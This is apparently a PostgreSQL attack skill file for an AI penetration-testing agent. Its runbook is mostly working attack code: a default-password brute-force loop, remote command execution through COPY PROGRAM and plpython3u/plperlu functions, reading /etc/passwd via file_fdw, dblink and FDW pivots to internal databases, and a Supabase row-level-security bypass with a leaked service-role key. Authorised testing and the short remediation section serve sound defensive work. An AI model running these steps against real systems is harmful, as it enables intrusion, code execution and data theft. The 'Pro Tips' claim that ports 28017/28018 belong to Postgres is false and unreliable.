---
name: postgres
description: PostgreSQL — pg_hba.conf, public schema, extensions (plpython, plperlu), COPY PROGRAM RCE, role chains
triggers: [postgres, postgresql, pg_hba, pgcrypto, plpython, plperl, copy program, dblink, foreign data wrapper, supabase]
---

# PostgreSQL Security

PostgreSQL's surface is large: **client authentication via pg_hba.conf**, **role + grant hierarchies**, **extensions with RCE primitives** (plpython, plperlu, COPY PROGRAM), **schema search-path tricks**, and **Foreign Data Wrappers** for cross-DB pivots. Modern deployments add managed-service layers (Supabase, RDS, Cloud SQL) with their own bugs on top.

## Attack Surface

### pg_hba.conf — connection authentication
- Format: `host <database> <user> <CIDR> <method>`
- Methods: `trust` (no auth), `md5`, `scram-sha-256`, `cert`, `peer`, `ident`
- Bug: `trust` for `0.0.0.0/0` → world-unauth
- Bug: `md5` instead of `scram-sha-256` (older, weaker hash)
- Bug: pg_hba.conf accessible via filesystem read in misconfigured restorable directories

### Role hierarchy
- Roles can be users (LOGIN) or groups (NOLOGIN)
- `INHERIT` (default) — role inherits parent permissions automatically
- `SUPERUSER` — bypasses all permission checks; should never be granted to app roles
- Bug: app role granted SUPERUSER "for migrations" → never demoted

### Public schema
- Pre-15.0: `public` schema writable by all users by default
- Bug: any logged-in user can create functions / tables / triggers in public schema
- Combined with search_path manipulation → privilege escalation

### Search path
- `SELECT name()` — Postgres resolves `name()` via search_path (`"$user", public` by default)
- Bug: attacker creates a function `public.encrypt(x)` that shadows `pgcrypto.encrypt` → callers run attacker's function

### Extensions with RCE primitives
- `plpython3u` (untrusted) — full Python RCE
- `plperlu` (untrusted) — full Perl RCE
- `pg_exec` (third-party) — direct shell exec
- `dblink` — cross-DB queries, can pivot to other Postgres instances
- `file_fdw` — read filesystem files
- Bug: extension granted to app role → role-equivalent RCE

### COPY ... PROGRAM (≥ 9.3)
- `COPY table TO PROGRAM 'cmd'` / `FROM PROGRAM 'cmd'` — shell exec
- Requires SUPERUSER OR `pg_execute_server_program` role
- Bug: SUPERUSER role compromised → instant shell

### Foreign Data Wrappers
- `postgres_fdw` to connect to another Postgres
- Bug: FDW with credentials embedded in `OPTIONS` → leaks via `pg_user_mappings`
- `dblink_connect` with cleartext password in SQL

### Backup files
- `pg_dump` produces `.sql` or `.dump`
- Bug: backups in web-accessible directories / public S3 buckets

### Supabase-specific (built on Postgres)
- Row-level security (RLS) policies in `auth.users`, `public.*`
- Bug: `auth.uid()` not validated server-side → bypass via headers
- Service-role key (`SUPABASE_SERVICE_ROLE_KEY`) bypasses RLS entirely
- Bug: `SUPABASE_SERVICE_ROLE_KEY` in client-side JS → tenant compromise

## Detection Channels

### Port + auth probe
```bash
# Direct connection
psql "host=<TARGET> port=5432 user=postgres dbname=postgres" -c '\l'

# Common roles / passwords
for user in postgres admin master root rdsadmin awsadmin pgadmin; do
  for pass in postgres '' admin password postgres123 'Postgres123!'; do
    PGPASSWORD="$pass" psql "host=<TARGET> port=5432 user=$user dbname=postgres" \
      -c '\conninfo' -t 2>&1 | head -1
  done
done
```

### Connection string leak
```bash
# Postgres URI: postgresql://user:pass@host:port/db
grep -rE 'postgresql?://[^@]+:[^@]+@' .

# Or split env vars
grep -rE 'POSTGRES_PASSWORD|PGPASSWORD|DATABASE_URL' .
```

### Supabase fingerprint
```bash
curl -s 'https://<TARGET>/' | grep -oE '@supabase/supabase-js|supabase\.co/auth/v1|supabase\.io'

# Supabase API URL
curl -s 'https://<TARGET>/' | grep -oE 'https://[a-z0-9-]+\.supabase\.co'
```

### Role enumeration (after connection)
```sql
-- List users + roles
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin
FROM pg_roles ORDER BY rolname;

-- Per-role membership
SELECT r.rolname, ARRAY_AGG(m.member::regrole::text) AS members
FROM pg_roles r LEFT JOIN pg_auth_members m ON m.roleid = r.oid
GROUP BY r.rolname;
```

## Operational Runbook

### Step 1 — connection probe
```bash
nc -zv <TARGET> 5432
nmap -sV -p 5432 <TARGET>
```

### Step 2 — default-creds login attempt
```bash
# Per the credential matrix above
PGPASSWORD=postgres psql "host=<TARGET> user=postgres dbname=postgres" -c '\l'
```

### Step 3 — schema + role enumeration
```sql
-- Connected as a low-priv user:
SELECT current_user, session_user, current_database();
SELECT * FROM pg_user;
SELECT nspname FROM pg_namespace WHERE nspname NOT IN ('pg_catalog','information_schema','pg_toast');

-- Per-schema tables
SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT LIKE 'pg_%';

-- Check for sensitive columns
SELECT table_schema, table_name, column_name FROM information_schema.columns
WHERE column_name ILIKE ANY (ARRAY['%ssn%', '%password%', '%credit%', '%email%', '%secret%']);
```

### Step 4 — privilege escalation paths
```sql
-- Check extensions
SELECT extname, extversion FROM pg_extension;

-- Check role membership chains
SELECT a.rolname AS member, b.rolname AS group FROM pg_roles a
  JOIN pg_auth_members m ON a.oid = m.member JOIN pg_roles b ON m.roleid = b.oid;

-- If you're in pg_execute_server_program OR are SUPERUSER:
COPY (SELECT 1) TO PROGRAM 'id';
```

### Step 5 — RCE via extensions
```sql
-- If plpython3u extension is available:
CREATE OR REPLACE FUNCTION strix_rce() RETURNS text AS $$
import subprocess
return subprocess.check_output(['id']).decode()
$$ LANGUAGE plpython3u;
SELECT strix_rce();
DROP FUNCTION strix_rce();

-- plperlu equivalent:
CREATE FUNCTION strix_rce_perl() RETURNS text AS $$
my $r = `id`;
return $r;
$$ LANGUAGE plperlu;
SELECT strix_rce_perl();
```

### Step 6 — read filesystem via file_fdw
```sql
CREATE EXTENSION file_fdw;
CREATE SERVER files FOREIGN DATA WRAPPER file_fdw;
CREATE FOREIGN TABLE strix_etc_passwd (line text) SERVER files OPTIONS (filename '/etc/passwd', format 'text');
SELECT * FROM strix_etc_passwd LIMIT 20;
```

### Step 7 — pivot via dblink / FDW
```sql
SELECT * FROM dblink('host=other-pg dbname=other user=admin password=admin', 'SELECT * FROM secrets') AS t(secret text);

-- Or postgres_fdw
CREATE EXTENSION postgres_fdw;
CREATE SERVER pivot FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'internal-db', dbname 'sensitive');
CREATE USER MAPPING FOR current_user SERVER pivot OPTIONS (user 'admin', password 'admin');
IMPORT FOREIGN SCHEMA public FROM SERVER pivot INTO public;
```

### Step 8 — Supabase RLS bypass
```bash
# Supabase service-role key bypasses RLS
SUPABASE_URL='https://<INSTANCE>.supabase.co'

# Direct REST call with service-role key (when leaked)
curl -H "apikey: $SERVICE_ROLE_KEY" -H "Authorization: Bearer $SERVICE_ROLE_KEY" \
  "${SUPABASE_URL}/rest/v1/users?select=*"
```

## Specific Vulnerability Classes

### Public schema search-path attack
- App calls `SELECT process(input)` expecting to call `myapp.process`
- Bug: search_path is `"$user", public`; attacker creates `public.process()` that runs first
- Attack: low-priv attacker creates a public function that exfils data via the app's SUPERUSER connection

### `lo_import` / `lo_export` (large objects)
- SUPERUSER can read/write filesystem via large object functions
- Bypass for `COPY ... PROGRAM` filters

### `pg_dump` access without read on tables
- `pg_dump` reads pg_catalog directly — bypasses RLS, bypasses row-level grants
- Bug: backup role with `pg_read_all_data` granted broadly

### Supabase JWT signing key leak
- Supabase uses JWT for session; the project has a JWT secret
- Leak the secret → forge any user's JWT → bypass RLS

## Bypass Techniques

- **`CREATE FUNCTION ... LANGUAGE sql SECURITY DEFINER`**: function runs as creator, not caller. Useful for low-priv → high-priv chains.
- **`pg_settings`**: read runtime config including `data_directory`, `hba_file`, `ssl`, etc.
- **`pg_read_server_files` role** (≥ 11): can `pg_read_file('/etc/passwd')` without being SUPERUSER.

## Validation

1. Connection succeeds with default creds OR no auth.
2. Schema enumeration returns sensitive column names.
3. Extension RCE: `SELECT strix_rce()` returns command output.
4. Filesystem read via file_fdw returns /etc/passwd.
5. Supabase service-role key bypasses RLS.

## False Positives

- Postgres reachable but TLS-only + IP-allow-list — confirm scope.
- Default `postgres` user disabled at the cluster level.
- Extensions installed but only accessible to SUPERUSER (the app role can't use them).
- Supabase service-role key in `.env` legitimately (server-side only) — confirm not exposed client-side.

## Impact

- Direct DB read/write → mass data exfil.
- RCE via extensions / COPY PROGRAM.
- Cross-DB pivot via FDW / dblink.
- Supabase tenant compromise via service-role key.

## Remediation

1. **`pg_hba.conf`: `scram-sha-256` everywhere**; no `trust` outside `localhost`.
2. **No SUPERUSER on app roles**: separate roles for migrations + runtime.
3. **`REVOKE CREATE ON SCHEMA public FROM PUBLIC`** (default in 15+).
4. **Extensions allow-list**: only install what's needed; never `plpython3u` / `plperlu` in production app DBs.
5. **`pg_hba.conf` denies for `0.0.0.0/0`**; specific CIDRs only.
6. **Backup files in secret-manager-protected storage**; never world-readable.
7. **Supabase service-role key NEVER in client JS**; only in server-side context.

## Pro Tips

1. The default `postgres` superuser still exists in most deployments — disabling it is an admin-only operation, frequently skipped.
2. Cloud-managed Postgres (RDS, Cloud SQL, Aurora) often allow `rds_superuser` / `cloudsqlsuperuser` with REPLICATION + LOGIN — different attack chains.
3. Supabase's `auth.users` table + RLS-on-public-tables is the canonical pattern; service-role key bypasses the entire model.
4. The 28017 / 28018 HTTP-status ports are gone post-Postgres 8; if they respond, you're on a very old install.
5. `dblink` is enabled in many production clusters "because the SDK needs it" — even when it doesn't.

## Summary

Postgres security is pg_hba.conf + role hierarchy + extension control + schema-search-path discipline. Audit each independently; Supabase adds the service-role-key bypass on top. The most impactful single audit: enumerate roles + extensions on the connected DB.
